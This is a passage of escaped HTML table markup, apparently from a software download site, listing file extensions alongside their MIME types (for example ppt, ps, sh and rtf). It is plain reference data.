VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/pdf</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">pfx</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-pkcs12</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">pgm</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/x-portable-graymap</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">pko</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/ynd.ms-pkipko</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">pma</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-perfmon</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">pmc</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-perfmon</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">pml</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-perfmon</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">pmr</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-perfmon</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">pmw</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-perfmon</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">pnm</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/x-portable-anymap</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">pot,</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/vnd.ms-<a href=\\"http://www.cr173.com/k/powerpoint/\\" target=\\"_blank\\">powerpoint</a></td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">ppm</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/x-portable-pixmap</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\"><a href=\\"http://www.cr173.com/k/pps/\\" target=\\"_blank\\">pps</a></td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/vnd.ms-powerpoint</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">ppt</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/vnd.ms-powerpoint</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">prf</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/pics-rules</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">ps</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/postscript</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">pub</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-mspublisher</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">qt</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/quicktime</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">ra</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">audio/x-pn-realaudio</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">ram</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">audio/x-pn-realaudio</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">ras</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/x-cmu-raster</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">rgb</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/x-rgb</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">rmi</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">audio/mid</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">roff</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-troff</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">rtf</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/rtf</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">rtx</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/richtext</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">scd</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-msschedule</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">sct</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/scriptlet</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">setpay</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/set-payment-initiation</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">setreg</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/set-registration-initiation</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">sh</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-sh</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">shar</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-shar</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">sit</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-stuffit</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">snd</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">audio/basic</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">spc</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-pkcs7-certificates</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">spl</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/futuresplash</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">src</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: 